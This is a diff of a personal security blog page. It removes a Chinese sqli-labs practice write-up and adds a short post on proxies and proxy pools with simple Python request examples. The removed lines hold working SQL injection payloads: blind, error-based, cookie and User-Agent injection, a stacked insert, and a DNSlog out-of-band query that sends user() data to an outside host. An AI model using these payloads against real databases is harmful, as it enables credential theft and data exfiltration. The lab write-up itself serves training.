@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>sqli-labs |  小张之栈</title>
+      <title>代理相关 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-sqli-labs"
+  id="post-dailipy"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -76,7 +76,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  sqli-labs
+  代理相关
 </h1>
  
 
@@ -84,11 +84,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/20/sqli-labs/" class="article-date">
-  <time datetime="2023-05-20T02:11:37.000Z" itemprop="datePublished">2023-05-20</time>
+      <a href="/2024/03/20/dailipy/" class="article-date">
+  <time datetime="2024-03-20T02:29:20.000Z" itemprop="datePublished">2024-03-20</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/">web漏洞</a> / <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/">sql注入</a> / <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/">靶场</a>
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/">代理技术</a>
   </div>
   
 <div class="word_count">
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">779</span>
+            <span class="post-count">794</span>
         </span>
     </span>
 
@@ -120,88 +120,29 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
-<h2 id="less-9-（单引号时间盲注）"><a href="#less-9-（单引号时间盲注）" class="headerlink" title="less 9 （单引号时间盲注）"></a>less 9 （单引号时间盲注）</h2><p>id&#x3D;1 id&#x3D;1’没有回显</p>
-<p>尝试id&#x3D;1’ and sleep(5)–+ 5s后显示  (注释符#也是没用的)</p>
-<p>id&#x3D; 1’ and if(length(database())&gt;0,sleep(5),1)–+</p>
-<p>id&#x3D;1’ and if(substr(database(),1,1)&gt;’a’,sleep(5),1)–+</p>
-<p>或者</p>
-<p>if(ascii(substr(database(),1,1))&gt;64,sleep(5),1)–+ 也是可以的</p>
-<p>爆破即可</p>
-<h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p><code>id=1‘ and (select load_file(concat(‘\\\\’,(select hex(user())),‘.ho26y3.dnslog.cn/abc’)))--+</code></p>
-<p><img src="/../../../Typora/img111/image-20230706140021367.png"></p>
-<p>对726F6F7440解码即可</p>
-<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
-<p>发现提示</p>
-<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
-<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
-<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
-<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
-<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
-<blockquote>
-<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
-</blockquote>
-<p>可以判定是有单引号的闭合</p>
-<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
-<blockquote>
-<p>the right syntax to use near ‘’ at line 1</p>
-</blockquote>
-<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
-<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
-<blockquote>
-<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>and替换成or也是可以的</p>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^id,username,password’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
-</blockquote>
-<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
-<blockquote>
-<p>Column count doesn’t match value count at row 1</p>
-</blockquote>
-<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
-<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
-</blockquote>
-<p>所以要闭合VALUES.</p>
-<p>利用$uagent，故构建格式，1’,1,1)#</p>
-<p>则：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
-</blockquote>
-<p>即：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
-</blockquote>
-<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
-<blockquote>
-<p>  XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>其余语句类似思路1。</p>
-<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
-<p>admin’，有报错信息…LIMIT..</p>
-<p>注释掉后，即admin’#，页面正常。</p>
-<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
-<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
-<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
-<p>嗯，报错注入也是可行的</p>
-<h2 id="less-38"><a href="#less-38" class="headerlink" title="less 38"></a>less 38</h2><p>id&#x3D;1’ 报错</p>
-<p>id&#x3D;1’–+回显成功<br><code>?id=0&#39; union select 1,user(),database(); insert into users(username,password) values(&#39;stack&#39;, &#39;stack&#39;)%23</code></p>
+  <h1 id="0x01-回顾"><a href="#0x01-回顾" class="headerlink" title="0x01 回顾"></a>0x01 回顾</h1><p>代理，分为正向，反向；正向呢，一般用于隐藏客户端，反向隐藏服务端。</p>
+<p>当IP被列为黑名单时，使用代理技术，即通过其它可用IP，可以继续访问</p>
+<p>为了自动化，这里有一个代理池的概念；一般公共代理池又很容易检测到，所以有的平台会出售代理服务，而且人性化地配备了几min就自动更换一次Ip的请求。</p>
+<p>这里主要是想用代码角度，去了解这种知识</p>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>代理池也是一种反爬虫的手段；参考了一些现有爬虫项目，可以看出</p>
+<p>针对代理池，一般是通过爬虫去爬取免费的代理数据，检查可用性，从而放进数据库中。</p>
+<p>代理常见的形式是<code>http://ip:port</code>，用过burpsuite的一般在浏览器或者相关设置上来一个如<code>http://127.0.0.1:1234</code>。</p>
+<p>这样的话，流量途径：浏览器请求-&gt;代理-&gt;目标页面</p>
+<p>下面是一种常见的单ip代理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要访问的网页URL</span></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/ip&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理服务器地址</span></span><br><span class="line">proxy_url = <span class="string">&#x27;http://127.0.0.1:2080&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 发送带有代理的请求</span></span><br><span class="line">    response = requests.get(url, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: proxy_url, <span class="string">&#x27;https&#x27;</span>: proxy_url&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查请求是否成功</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;代理成功，网页内容为：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法获取网页内容，状态码：&quot;</span>, response.status_code)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请求发生异常：&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>主要原理就是去访问一个能检测当前IP的网址，查看回显情况。但这里是通过连接到客户端的形式，不能随意切换IP</p>
+<p>如果是一般多IP的方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用的代理节点列表</span></span><br><span class="line">proxy_list = [</span><br><span class="line">    <span class="string">&#x27;http://proxy1_ip:proxy1_port&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;http://proxy2_ip:proxy2_port&#x27;</span>,</span><br><span class="line">    <span class="comment"># 添加更多代理节点</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要访问的网页URL</span></span><br><span class="line">url = <span class="string">&#x27;http://example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 遍历代理节点列表</span></span><br><span class="line">    <span class="keyword">for</span> proxy <span class="keyword">in</span> proxy_list:</span><br><span class="line">        <span class="comment"># 发送带有当前代理节点的请求</span></span><br><span class="line">        response = requests.get(url, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: proxy, <span class="string">&#x27;https&#x27;</span>: proxy&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查请求是否成功</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;成功获取网页内容，使用代理节点：<span class="subst">&#123;proxy&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 如果成功获取到网页内容，则停止遍历</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;无法获取网页内容，状态码：<span class="subst">&#123;response.status_code&#125;</span>，尝试下一个代理节点&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请求发生异常：&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就是遍历访问，如果成功获取就退出遍历</p>
+<p>对于一个代理网站的爬取过程：</p>
+<p>访问目标站-&gt;根据目标站实际显示情况(html还是表格)-&gt;正则取出IP信息-&gt;存入数据库</p>
+<p>数据库调用该代理的原则：</p>
+<p>按分数排序，初始有最大分值，每次使用时，该代理反馈的情况不好，就减1，反之加1；所以取代理的方式就是，第一次取分高的，第二次次之，最后随便了</p>
+<p>点到为止，这种技术不好细究</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/fengzhizi715/ProxyPool">https://github.com/fengzhizi715/ProxyPool</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/chenjiandongx/async-proxy-pool">https://github.com/chenjiandongx/async-proxy-pool</a></p>
  
       <!-- reward -->
       
@@ -266,12 +207,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/20/sqli-labs/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/03/20/dailipy/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%95%E8%BF%87/" rel="tag">绕过</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/" rel="tag">代理技术</a></li></ul>
 
     </footer>
   </div>
@@ -279,19 +220,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/05/20/python%E4%B8%8E%E6%B8%97%E9%80%8F/" class="article-nav-link">
+      <a href="/2024/03/20/websocket/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            python与渗透
+            websocket
           
         </div>
       </a>
     
     
-      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/" class="article-nav-link">
+      <a href="/2024/03/12/daimashenji/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">sql注入-tips</div>
+        <div class="article-nav-title">代码审计</div>
       </a>
     
   </nav>
